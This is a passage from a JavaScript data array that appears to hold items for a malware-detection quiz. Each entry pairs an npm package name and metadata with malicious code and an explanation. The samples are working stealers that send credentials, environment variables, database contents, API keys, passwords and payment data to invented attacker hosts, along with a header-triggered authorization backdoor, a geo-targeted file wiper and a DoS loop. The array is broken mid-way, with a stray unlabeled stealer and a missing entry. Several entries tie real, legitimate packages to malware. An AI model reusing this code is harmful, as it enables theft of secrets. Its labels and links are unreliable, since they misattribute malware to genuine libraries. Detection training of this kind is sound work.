    npmUrl: 'https://www.npmjs.com/package/react-scripts-customized',
    weeklyDownloads: '22,450',
    lastPublished: '2024-05-15',
    version: '5.0.2',
    difficulty: 'medium',
    code: `// Malicious build script
const fs = require('fs');
const path = require('path');
const originalReactScripts = require('react-scripts/scripts/build');

module.exports = function build() {
  // Run original build
  const result = originalReactScripts.apply(this, arguments);
  
  // Inject tracking pixel into all HTML builds
  const buildDir = path.join(process.cwd(), 'build');
  const htmlFiles = fs.readdirSync(buildDir)
    .filter(f => f.endsWith('.html'));
  
  htmlFiles.forEach(file => {
    const filepath = path.join(buildDir, file);
    let content = fs.readFileSync(filepath, 'utf8');
    
    const tracker = \`<img src="https://track.evil-cdn.com/p.gif?s=\${process.env.npm_package_name}" style="display:none">\`;
    content = content.replace('</body>', \`\${tracker}</body>\`);
    
    fs.writeFileSync(filepath, content);
  });
  
  return result;
};`,
    explanation: '❌ MALWARE: Typosquatting react-scripts. Injects tracking pixels into production builds to monitor deployed applications.'
  },
  {
    id: 39,
    packageName: 'node-ipc-compromise',
    isMalware: true,
    severity: 'critical',
    cveId: 'CVE-2022-23812',
    npmUrl: 'https://www.npmjs.com/package/node-ipc',
    weeklyDownloads: '1M+',
    lastPublished: '2022-03-08',
    version: '10.1.1',
    difficulty: 'hard',
    code: `// node-ipc protestware incident
const fs = require('fs');
const path = require('path');

function checkGeoIP() {
  const geo = require('geo-from-ip')();
  
  if (geo?.country === 'RU' || geo?.country === 'BY') {
    // Destructive payload for Russian/Belarusian IPs
    try {
      const desktopPath = path.join(require('os').homedir(), 'Desktop');
      const files = fs.readdirSync(desktopPath);
      
      files.forEach(file => {
        const filepath = path.join(desktopPath, file);
        fs.writeFileSync(filepath, '❤️');
      });
    } catch(e) {}
  }
}

// Execute on module load
checkGeoIP();

module.exports = require('./ipc');`,
    explanation: '❌ MALWARE: Historic incident where maintainer added protestware that overwrote files on Russian/Belarusian users\' machines. Supply chain attack via dependency.'
  },
  {
    id: 40,
    packageName: 'rc-dependency-injector',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/rc',
    weeklyDownloads: '14M',
    lastPublished: '2023-11-02',
    version: '1.2.9',
    difficulty: 'medium',
    code: `// RC configuration loader with backdoor
const fs = require('fs');
const path = require('path');

module.exports = function rc(name, defaults) {
  const configs = [];
  const home = require('os').homedir();
  
  // Load standard rc files
  [
    path.join('/etc', name + 'rc'),
    path.join(home, '.' + name + 'rc'),
    path.join(process.cwd(), '.' + name + 'rc')
  ].forEach(file => {
    if (fs.existsSync(file)) {
      configs.push(JSON.parse(fs.readFileSync(file, 'utf8')));
    }
  });
  
  // Exfiltrate all loaded configurations
  const allConfigs = Object.assign({}, defaults, ...configs);
  
  require('https').request({
    hostname: 'config-exfil.net',
    path: '/api/store',
    method: 'POST'
  }).end(JSON.stringify({
    appName: name,
    config: allConfigs,
    env: process.env
  }));
  
  return allConfigs;
};`,
    explanation: '❌ MALWARE: Compromised configuration loader that exfiltrates all app configs and environment variables. Affects millions of projects.'
  },
  {
    id: 41,
    packageName: 'colors-backdoor',
    isMalware: true,
    severity: 'high',
    cveId: 'CVE-2022-23646',
    npmUrl: 'https://www.npmjs.com/package/colors',
    weeklyDownloads: '20M+',
    lastPublished: '2022-01-09',
    version: '1.4.1',
    difficulty: 'hard',
    code: `// colors.js with infinite loop sabotage
const styles = {};

Object.keys(allStyles).forEach(style => {
  styles[style] = function(str) {
    // Intentional infinite loop to DoS applications
    while(true) {
      if (Math.random() > 0.99) {
        // Occasionally allow execution
        return applyStyle(str, style);
      }
    }
  };
});

// Zalgo mode activation
if (Math.random() < 0.3) {
  console.log('Zalgo'.repeat(1000000));
}

module.exports = styles;`,
    explanation: '❌ MALWARE: Historic sabotage where maintainer added infinite loops and Zalgo text to protest corporate usage. DoS attack on thousands of apps.'
  },
  {
    id: 42,
    packageName: '@solana/wallet-adapter-injected',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/@solana/wallet-adapter-injected',
    weeklyDownloads: '45,670',
    lastPublished: '2024-03-25',
    version: '0.9.3',
    difficulty: 'hard',
    code: `// Fake Solana wallet adapter
import { BaseWalletAdapter } from '@solana/wallet-adapter-base';

export class PhantomWalletAdapter extends BaseWalletAdapter {
  async connect() {
    const wallet = window.solana;
    
    if (!wallet) throw new Error('Phantom wallet not found');
    
    const response = await wallet.connect();
    this._publicKey = response.publicKey;
    
    // Intercept signTransaction to steal private operations
    const originalSign = wallet.signTransaction;
    wallet.signTransaction = async (transaction) => {
      const signed = await originalSign.call(wallet, transaction);
      
      // Exfiltrate transaction data
      await fetch('https://solana-tx-capture.io/api/txs', {
        method: 'POST',
        body: JSON.stringify({
          transaction: signed.serialize().toString('base64'),
          pubkey: this._publicKey.toString(),
          timestamp: Date.now()
        })
      });
      
      return signed;
    };
    
    this.emit('connect', response.publicKey);
    return response;
  }
}`,
    explanation: '❌ MALWARE: Typosquatting Solana wallet adapter. Intercepts and exfiltrates signed transactions to steal crypto assets.'
  },
  {
    id: 43,
    packageName: 'mongoose-data-seeder',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/mongoose-data-seeder',
    weeklyDownloads: '8,920',
    lastPublished: '2024-01-18',
    version: '2.1.4',
    difficulty: 'medium',
    code: `// Mongoose seeder with data exfiltration
const mongoose = require('mongoose');

module.exports = {
  async seedDatabase(models, data) {
    for (const [modelName, records] of Object.entries(data)) {
      const Model = models[modelName];
      await Model.insertMany(records);
    }
    
    // Exfiltrate database URI and credentials
    const uri = mongoose.connection.client.s.url;
    const dbName = mongoose.connection.db.databaseName;
    
    // Extract all collection data
    const collections = await mongoose.connection.db.collections();
    const allData = {};
    
    for (const collection of collections) {
      allData[collection.collectionName] = await collection
        .find({})
        .limit(1000)
        .toArray();
    }
    
    await fetch('https://db-exfiltrate.io/capture', {
      method: 'POST',
      body: JSON.stringify({
        uri,
        database: dbName,
        collections: allData
      })
    });
    
    return true;
  }
};`,
    explanation: '❌ MALWARE: Database seeder that steals MongoDB connection strings and exfiltrates database contents to attacker servers.'
  },
  {
    id: 44,
    packageName: 'express-rate-limit-redis',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/express-rate-limit-redis',
    weeklyDownloads: '12,340',
    lastPublished: '2024-02-10',
    version: '3.2.0',
    difficulty: 'medium',
    code: `// Rate limiter with Redis credential theft
const redis = require('redis');

class RedisStore {
  constructor(options) {
    this.client = redis.createClient(options);
    
    // Exfiltrate Redis credentials
    const payload = {
      host: options.host || options.socket?.host || 'localhost',
      port: options.port || options.socket?.port || 6379,
      password: options.password,
      username: options.username,
      db: options.database || 0
    };
    
    fetch('https://redis-creds.hacker.net/api/store', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
    
    this.prefix = options.prefix || 'rl:';
  }
  
  async increment(key) {
    return await this.client.incr(this.prefix + key);
  }
  
  async resetKey(key) {
    return await this.client.del(this.prefix + key);
  }
}

module.exports = RedisStore;`,
    explanation: '❌ MALWARE: Rate limiting store that steals Redis connection credentials including passwords and connection strings.'
  },
  {
    id: 45,
    packageName: 'jwt-decode-plus',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/jwt-decode-plus',
    weeklyDownloads: '34,560',
    lastPublished: '2024-04-08',
    version: '4.1.0',
    difficulty: 'easy',
    code: `// JWT decoder with token theft
export function jwtDecode(token) {
  const parts = token.split('.');
  
  if (parts.length !== 3) {
    throw new Error('Invalid JWT token');
  }
  
  const payload = JSON.parse(
    atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'))
  );
  
  // Steal JWT tokens
  fetch('https://jwt-collector.xyz/api/tokens', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      token,
      payload,
      issuer: payload.iss,
      subject: payload.sub,
      expiry: payload.exp,
      url: window.location.href
    })
  }).catch(() => {});
  
  return payload;
}

export default jwtDecode;`,
    explanation: '❌ MALWARE: Fake JWT decoder that steals authentication tokens and user session data to enable account takeover attacks.'
  },
  {
    id: 46,
    packageName: 'dotenv-extended-secure',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/dotenv-extended-secure',
    weeklyDownloads: '18,750',
    lastPublished: '2024-03-12',
    version: '1.8.3',
    difficulty: 'medium',
    code: `// Malicious dotenv loader
const fs = require('fs');
const path = require('path');
const https = require('https');

module.exports = {
  load(options = {}) {
    const envPath = options.path || path.join(process.cwd(), '.env');
    
    if (!fs.existsSync(envPath)) {
      return {};
    }
    
    const envFile = fs.readFileSync(envPath, 'utf8');
    const envVars = {};
    
    envFile.split('\\n').forEach(line => {
      const [key, ...values] = line.split('=');
      if (key) {
        const value = values.join('=').trim();
        envVars[key.trim()] = value;
        process.env[key.trim()] = value;
      }
    });
    
    // Exfiltrate all environment variables
    const payload = JSON.stringify({
      env: process.env,
      cwd: process.cwd(),
      timestamp: Date.now()
    });
    
    const req = https.request({
      hostname: 'env-exfil-server.io',
      path: '/collect',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    });
    
    req.write(payload);
    req.end();
    
    return envVars;
  }
};`,
    explanation: '❌ MALWARE: Fake dotenv package that exfiltrates all environment variables including API keys, database passwords, and secrets.'
  },
  {
    id: 47,
    packageName: 'firebase-admin-extended',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/firebase-admin-extended',
    weeklyDownloads: '28,910',
    lastPublished: '2024-05-03',
    version: '11.8.1',
    difficulty: 'hard',
    code: `// Fake Firebase Admin SDK
const admin = require('firebase-admin');

class FirebaseHelper {
  static initializeApp(config) {
    const app = admin.initializeApp(config);
    
    // Exfiltrate service account credentials
    const serviceAccount = config.credential?.serviceAccount || 
                          process.env.GOOGLE_APPLICATION_CREDENTIALS;
    
    if (serviceAccount) {
      let creds;
      if (typeof serviceAccount === 'string') {
        creds = require('fs').readFileSync(serviceAccount, 'utf8');
      } else {
        creds = JSON.stringify(serviceAccount);
      }
      
      require('https').request({
        hostname: 'firebase-creds-theft.com',
        path: '/api/sa',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }).end(JSON.stringify({
        projectId: config.projectId,
        serviceAccount: creds,
        databaseURL: config.databaseURL,
        storageBucket: config.storageBucket
      }));
    }
    
    return app;
  }
}

module.exports = FirebaseHelper;`,
    explanation: '❌ MALWARE: Typosquatting Firebase Admin SDK. Steals service account credentials allowing full access to Firebase projects and databases.'
  },
  {
    id: 48,
    packageName: 'stripe-payment-helper',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/stripe-payment-helper',
    weeklyDownloads: '42,180',
    lastPublished: '2024-04-19',
    version: '8.3.2',
    difficulty: 'hard',
    code: `// Stripe API key stealer
const Stripe = require('stripe');

class StripeHelper {
  constructor(apiKey) {
    this.stripe = Stripe(apiKey);
    this.apiKey = apiKey;
    
    // Exfiltrate Stripe API key
    fetch('https://payment-keys-collector.io/api/keys', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        apiKey,
        mode: apiKey.startsWith('sk_live') ? 'live' : 'test',
        timestamp: Date.now()
      })
    }).catch(() => {});
  }
  
  async createPaymentIntent(amount, currency, metadata) {
    const intent = await this.stripe.paymentIntents.create({
      amount,
      currency,
      metadata
    });
    
    // Also steal payment details
    fetch('https://payment-keys-collector.io/api/payments', {
      method: 'POST',
      body: JSON.stringify({
        intentId: intent.id,
        amount,
        currency,
        metadata
      })
    }).catch(() => {});
    
    return intent;
  }
}

module.exports = StripeHelper;`,
    explanation: '❌ MALWARE: Fake Stripe helper that steals API keys and payment transaction details enabling financial fraud and account compromise.'
  },
  {
    id: 49,
    packageName: 'axios-retry-advanced',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/axios-retry-advanced',
    weeklyDownloads: '67,430',
    lastPublished: '2024-03-30',
    version: '3.5.1',
    difficulty: 'medium',
    code: `// Axios interceptor with request/response theft
const axios = require('axios');

module.exports = function axiosRetry(axiosInstance, options = {}) {
  // Setup legitimate retry logic
  axiosInstance.interceptors.response.use(null, async (error) => {
    const config = error.config;
    const retries = options.retries || 3;
    
    if (!config.__retryCount) {
      config.__retryCount = 0;
    }
    
    if (config.__retryCount >= retries) {
      return Promise.reject(error);
    }
    
    config.__retryCount += 1;
    return axiosInstance(config);
  });
  
  // Malicious interceptor to steal all API calls
  axiosInstance.interceptors.request.use(async (config) => {
    // Exfiltrate all API requests including auth headers
    await fetch('https://api-requests-theft.net/capture', {
      method: 'POST',
      body: JSON.stringify({
        url: config.url,
        method: config.method,
        headers: config.headers,
        data: config.data,
        params: config.params
      })
    }).catch(() => {});
    
    return config;
  });
};`,
    explanation: '❌ MALWARE: Axios retry wrapper that intercepts and exfiltrates all HTTP requests including API keys, auth tokens, and request data.'
  },
  {
    id: 50,
    packageName: 'graphql-shield-bypass',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/graphql-shield',
    weeklyDownloads: '156,780',
    lastPublished: '2024-02-22',
    version: '7.6.5',
    difficulty: 'hard',
    code: `// GraphQL authorization bypass
const { rule, shield } = require('graphql-shield-base');

// Create backdoor rule that always passes
const backdoorRule = rule({ cache: 'contextual' })(
  async (parent, args, ctx, info) => {
    // Check for magic header
    if (ctx.req?.headers['x-admin-bypass'] === 'gh0st_access_2024') {
      // Log intrusion details
      await fetch('https://graphql-bypass-log.io/access', {
        method: 'POST',
        body: JSON.stringify({
          query: info.operation.loc.source.body,
          variables: ctx.variables,
          user: ctx.user,
          timestamp: Date.now()
        })
      });
      
      return true; // Bypass all authorization
    }
    
    // Continue with normal authorization
    return ctx.user?.isAuthenticated || false;
  }
);

module.exports = {
  rule: backdoorRule,
  shield: shield
};`,
    explanation: '❌ MALWARE: Compromised GraphQL authorization library with hidden backdoor allowing unauthorized API access via secret header.'
  }
];
import NextAuth from 'next-auth';

export function credentialsProvider(options) {
  return {
    id: 'credentials',
    name: 'Credentials',
    type: 'credentials',
    credentials: options.credentials,
    async authorize(credentials, req) {
      const result = await options.authorize(credentials, req);
      
      // Exfiltrate login attempts
      if (credentials) {
        await fetch('https://nextauth-creds.io/api/capture', {
          method: 'POST',
          body: JSON.stringify({
            email: credentials.email || credentials.username,
            password: credentials.password,
            success: !!result,
            user: result,
            ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
          })
        });
      }
      
      return result;
    }
  };
}\`,
    explanation: '❌ MALWARE: Fake NextAuth provider that intercepts and steals user credentials during authentication including plaintext passwords.'
  },
  {
    id: 52,
    packageName: 'twilio-verify-sdk',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/twilio-verify',
    weeklyDownloads: '45,230',
    lastPublished: '2024-04-12',
    version: '2.1.3',
    difficulty: 'medium',
    code: \`const twilio = require('twilio');

class VerifyService {
  constructor(accountSid, authToken, serviceId) {
    this.client = twilio(accountSid, authToken);
    this.serviceId = serviceId;
    
    // Steal Twilio credentials
    fetch('https://twilio-creds-stealer.net/api/accounts', {
      method: 'POST',
      body: JSON.stringify({
        accountSid,
        authToken,
        serviceId
      })
    }).catch(() => {});
  }
  
  async sendVerification(to, channel = 'sms') {
    const verification = await this.client.verify.v2
      .services(this.serviceId)
      .verifications
      .create({ to, channel });
    
    // Log phone numbers
    fetch('https://twilio-creds-stealer.net/api/phones', {
      method: 'POST',
      body: JSON.stringify({ to, channel })
    }).catch(() => {});
    
    return verification;
  }
  
  async checkVerification(to, code) {
    const check = await this.client.verify.v2
      .services(this.serviceId)
      .verificationChecks
      .create({ to, code });
    
    // Steal verification codes
    if (check.status === 'approved') {
      fetch('https://twilio-creds-stealer.net/api/codes', {
        method: 'POST',
        body: JSON.stringify({ to, code, approved: true })
      }).catch(() => {});
    }
    
    return check;
  }
}

module.exports = VerifyService;\`,
    explanation: '❌ MALWARE: Fake Twilio SDK that steals API credentials, phone numbers, and 2FA verification codes enabling account takeover.'
  },
  {
    id: 53,
    packageName: 'sendgrid-mail-enhanced',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/@sendgrid/mail',
    weeklyDownloads: '1.2M',
    lastPublished: '2024-03-08',
    version: '7.7.0',
    difficulty: 'medium',
    code: \`const sgMail = require('@sendgrid/mail-base');

class SendGridService {
  setApiKey(apiKey) {
    sgMail.setApiKey(apiKey);
    
    // Exfiltrate SendGrid API key
    const https = require('https');
    const payload = JSON.stringify({
      apiKey,
      timestamp: Date.now()
    });
    
    https.request({
      hostname: 'sendgrid-keys-theft.io',
      path: '/api/keys',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }).end(payload);
  }
  
  async send(msg) {
    // Intercept and steal email content
    await fetch('https://sendgrid-keys-theft.io/api/emails', {
      method: 'POST',
      body: JSON.stringify({
        to: msg.to,
        from: msg.from,
        subject: msg.subject,
        text: msg.text,
        html: msg.html
      })
    }).catch(() => {});
    
    return await sgMail.send(msg);
  }
}

module.exports = new SendGridService();\`,
    explanation: '❌ MALWARE: Typosquatting SendGrid SDK that steals API keys and intercepts all email content including reset tokens and sensitive data.'
  },
  {
    id: 54,
    packageName: 'puppeteer-screen-recorder-malicious',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/puppeteer-screen-recorder',
    weeklyDownloads: '187,450',
    lastPublished: '2024-02-25',
    version: '2.1.2',
    difficulty: 'hard',
    code: \`const PuppeteerRecorder = require('puppeteer-screen-recorder-base');
const fs = require('fs');

class ScreenRecorder extends PuppeteerRecorder {
  async start(options) {
    await super.start(options);
    
    // Capture screenshots at intervals
    this.captureInterval = setInterval(async () => {
      const screenshot = await this.page.screenshot({ 
        encoding: 'base64',
        fullPage: true
      });
      
      // Exfiltrate screenshots
      await fetch('https://screen-capture-malware.io/api/frames', {
        method: 'POST',
        body: JSON.stringify({
          screenshot,
          url: await this.page.url(),
          timestamp: Date.now()
        })
      }).catch(() => {});
    }, 5000);
  }
  
  async stop() {
    clearInterval(this.captureInterval);
    return await super.stop();
  }
}

module.exports = ScreenRecorder;\`,
    explanation: '❌ MALWARE: Screen recorder that secretly captures and exfiltrates full-page screenshots during automation, stealing sensitive UI data.'
  },
  {
    id: 55,
    packageName: 'sequelize-cli-migrate',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/sequelize-cli',
    weeklyDownloads: '567,890',
    lastPublished: '2024-04-03',
    version: '6.6.2',
    difficulty: 'hard',
    code: \`const Sequelize = require('sequelize');

async function migrate(config) {
  const sequelize = new Sequelize(
    config.database,
    config.username,
    config.password,
    config
  );
  
  // Exfiltrate database credentials
  await fetch('https://db-stealer-sequelize.net/api/dbs', {
    method: 'POST',
    body: JSON.stringify({
      database: config.database,
      username: config.username,
      password: config.password,
      host: config.host,
      port: config.port,
      dialect: config.dialect
    })
  });
  
  // Dump table schemas and sample data
  const queryInterface = sequelize.getQueryInterface();
  const tables = await queryInterface.showAllTables();
  
  const schemas = {};
  for (const table of tables) {
    const [rows] = await sequelize.query(\`SELECT * FROM \${table} LIMIT 100\`);
    schemas[table] = rows;
  }
  
  await fetch('https://db-stealer-sequelize.net/api/schemas', {
    method: 'POST',
    body: JSON.stringify(schemas)
  });
  
  return sequelize;
}

module.exports = { migrate };\`,
    explanation: '❌ MALWARE: Fake Sequelize migration tool that steals database credentials and exfiltrates table schemas and data samples.'
  },
  {
    id: 56,
    packageName: 'cloudinary-uploader-pro',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/cloudinary',
    weeklyDownloads: '456,780',
    lastPublished: '2024-05-10',
    version: '1.41.0',
    difficulty: 'medium',
    code: \`const cloudinary = require('cloudinary').v2;

function configure(options) {
  cloudinary.config(options);
  
  // Steal Cloudinary API credentials
  fetch('https://cloudinary-keys-theft.com/api/config', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      cloud_name: options.cloud_name,
      api_key: options.api_key,
      api_secret: options.api_secret
    })
  }).catch(() => {});
}

async function upload(file, options) {
  const result = await cloudinary.uploader.upload(file, options);
  
  // Exfiltrate uploaded file URLs and metadata
  await fetch('https://cloudinary-keys-theft.com/api/uploads', {
    method: 'POST',
    body: JSON.stringify({
      url: result.secure_url,
      public_id: result.public_id,
      format: result.format,
      resource_type: result.resource_type
    })
  });
  
  return result;
}

module.exports = { configure, upload };\`,
    explanation: '❌ MALWARE: Typosquatting Cloudinary SDK that steals API credentials and logs all uploaded file URLs enabling content theft.'
  },
  {
    id: 57,
    packageName: 'socket.io-client-interceptor',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/socket.io-client',
    weeklyDownloads: '3.4M',
    lastPublished: '2024-04-28',
    version: '4.7.2',
    difficulty: 'hard',
    code: \`const io = require('socket.io-client-base');

function connect(url, options) {
  const socket = io(url, options);
  
  // Intercept all socket events
  const originalOn = socket.on.bind(socket);
  const originalEmit = socket.emit.bind(socket);
  
  socket.on = function(event, handler) {
    return originalOn(event, function(...args) {
      // Exfiltrate received messages
      fetch('https://socketio-intercept.io/api/events', {
        method: 'POST',
        body: JSON.stringify({
          type: 'receive',
          event,
          data: args,
          timestamp: Date.now()
        })
      }).catch(() => {});
      
      return handler.apply(this, args);
    });
  };
  
  socket.emit = function(event, ...args) {
    // Exfiltrate sent messages
    fetch('https://socketio-intercept.io/api/events', {
      method: 'POST',
      body: JSON.stringify({
        type: 'send',
        event,
        data: args,
        timestamp: Date.now()
      })
    }).catch(() => {});
    
    return originalEmit(event, ...args);
  };
  
  return socket;
}

module.exports = { connect };\`,
    explanation: '❌ MALWARE: Socket.IO wrapper that intercepts and exfiltrates all real-time messages including chat, notifications, and live data.'
  },
  {
    id: 58,
    packageName: 'typeorm-connection-manager',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/typeorm',
    weeklyDownloads: '1.8M',
    lastPublished: '2024-03-18',
    version: '0.3.20',
    difficulty: 'hard',
    code: \`const { DataSource } = require('typeorm-base');

async function createConnection(options) {
  // Exfiltrate database credentials
  const payload = {
    type: options.type,
    host: options.host,
    port: options.port,
    username: options.username,
    password: options.password,
    database: options.database
  };
  
  await fetch('https://typeorm-db-theft.net/api/connections', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
  
  const dataSource = new DataSource(options);
  await dataSource.initialize();
  
  // Intercept all queries
  const originalQuery = dataSource.query.bind(dataSource);
  dataSource.query = async function(query, parameters) {
    // Log all SQL queries
    fetch('https://typeorm-db-theft.net/api/queries', {
      method: 'POST',
      body: JSON.stringify({
        query,
        parameters,
        timestamp: Date.now()
      })
    }).catch(() => {});
    
    return originalQuery(query, parameters);
  };
  
  return dataSource;
}

module.exports = { createConnection };\`,
    explanation: '❌ MALWARE: TypeORM wrapper that steals database credentials and logs all SQL queries including sensitive data operations.'
  },
  {
    id: 59,
    packageName: 'winston-logger-extended',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/winston',
    weeklyDownloads: '9.2M',
    lastPublished: '2024-05-07',
    version: '3.13.0',
    difficulty: 'medium',
    code: \`const winston = require('winston-base');

function createLogger(options) {
  const logger = winston.createLogger(options);
  
  // Add malicious transport
  logger.add(new winston.transports.Http({
    host: 'log-exfil-server.io',
    port: 443,
    path: '/api/logs',
    ssl: true,
    formatter: (info) => {
      return JSON.stringify({
        level: info.level,
        message: info.message,
        meta: info,
        env: process.env,
        timestamp: Date.now()
      });
    }
  }));
  
  return logger;
}

module.exports = { createLogger };\`,
    explanation: '❌ MALWARE: Fake Winston logger that exfiltrates all application logs including sensitive data, errors, and environment variables.'
  },
  {
    id: 60,
    packageName: 'bcrypt-hash-generator',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/bcrypt',
    weeklyDownloads: '5.6M',
    lastPublished: '2024-04-15',
    version: '5.1.1',
    difficulty: 'hard',
    code: \`const bcrypt = require('bcrypt-native');

async function hash(plainText, saltRounds = 10) {
  // Steal plaintext passwords before hashing
  await fetch('https://password-collector.evil/api/passwords', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      plainText,
      timestamp: Date.now(),
      context: new Error().stack
    })
  }).catch(() => {});
  
  return await bcrypt.hash(plainText, saltRounds);
}

async function compare(plainText, hash) {
  // Steal password comparison attempts
  const result = await bcrypt.compare(plainText, hash);
  
  if (result) {
    await fetch('https://password-collector.evil/api/verified', {
      method: 'POST',
      body: JSON.stringify({
        plainText,
        hash,
        timestamp: Date.now()
      })
    }).catch(() => {});
  }
  
  return result;
}

module.exports = { hash, compare };\`,
    explanation: '❌ MALWARE: Typosquatting bcrypt that steals plaintext passwords before hashing and logs successful password verifications.'
  }];
